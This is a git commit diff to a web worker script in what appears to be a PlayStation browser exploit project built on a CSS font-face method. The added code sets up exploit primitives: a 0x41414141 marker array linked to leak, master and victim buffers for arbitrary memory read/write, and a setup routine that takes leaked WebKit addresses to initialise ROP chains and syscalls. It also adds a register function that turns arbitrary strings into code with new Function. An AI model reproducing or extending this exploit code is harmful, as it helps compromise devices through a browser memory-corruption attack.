224ec504b48baa313fa5b719dc63fecb021de4ba
Gustuds <133971717+Gustuds@users.noreply.github.com>
2026-07-26 12:50:58 +0300

    Update worker.js

--- methods/cssfontface/files/public/src/worker.js
+++ methods/cssfontface/files/public/src/worker.js
@@ -5,64 +5,114 @@ let marker_arr = new Uint32Array(new ArrayBuffer(0x10));
 const transfer = [];
 const api = {
   init(name) {
-
-    logger.debug("worker: init entered");
-
     self.name = name;
 
-    logger.debug("worker: self.name OK");
-
     version.init();
-
-    logger.debug("worker: version.init OK");
-
     switch (version.console) {
-
-        case 4:
-
-            logger.debug("worker: importScripts begin");
-
-            importScripts("ps4/constants.js", "ps4/userland.js");
-
-            logger.debug("worker: importScripts OK");
-
-            break;
-
-        case 5:
-
-            break;
-
-        default:
-
-            throw new Error(`Unsupported console ${version.console}`);
+      case 4:
+        importScripts("ps4/constants.js", "ps4/userland.js");
+        break;
+      case 5:
+        //TODO
+        break;
+      default:
+        throw new Error(`Unsupported console ${version.console}`);
     }
-
-    logger.debug("worker: creating arw.master");
 
     arw.master = new Uint32Array(6);
 
-    logger.debug("worker: marker.fill");
-
     marker_arr.fill(0x41414141);
-
-    logger.debug("worker: marker.leak");
-
     marker_arr.leak = arw.leak;
-
-    logger.debug("worker: marker.master");
-
     marker_arr.master = arw.master;
-
-    logger.debug("worker: marker.victim");
-
     marker_arr.victim = arw.victim;
-
-    logger.debug("worker: transfer.push");
 
     transfer.push(marker_arr.buffer);
 
-    logger.debug("worker: returning");
-
     return marker_arr;
-},
+  },
+  setup(leak_addr, wk_base) {
+    transfer.length = 0;
+
+    marker_arr = null;
+
+    arw.leak_addr = new BInt(leak_addr);
+    webkit_base = new BInt(wk_base);
+
+    init_arw();
+    init_rop();
+    init_syscalls();
+
+    return true;
+  },
+  register(name, fn) {
+    if (typeof fn !== "string") {
+      throw new Error(`${fn} not a string !!`);
+    }
+
+    if (name in api) {
+      throw new Error(`${name} already registered !!`);
+    }
+
+    api[name] = new Function(`return (${fn})`)();
+
+    return true;
+  },
+  ping() {
+    return "pong";
+  },
+};
+
+self.onmessage = async (e) => {
+
+    const { id, name, args = [] } = e.data || {};
+
+    try {
+
+        logger.info("worker: received " + name);
+
+        const fn = api[name];
+
+        if (typeof fn !== "function") {
+
+            throw new Error("Unknown function " + name);
+
+        }
+
+        logger.info("worker: calling " + name);
+
+        const ret = await fn(...args);
+
+        logger.info("worker: " + name + " finished");
+
+        self.postMessage({
+
+            id,
+            type: "ret",
+            value: ret
+
+        }, transfer);
+
+    } catch (err) {
+
+        logger.error("WORKER EXCEPTION");
+
+        logger.error(String(err));
+
+        logger.error(err.stack || "");
+
+        self.postMessage({
+
+            id,
+            type: "err",
+            value: {
+
+                message: String(err),
+                stack: err.stack || ""
+
+            }
+
+        });
+
+    }
+
 };
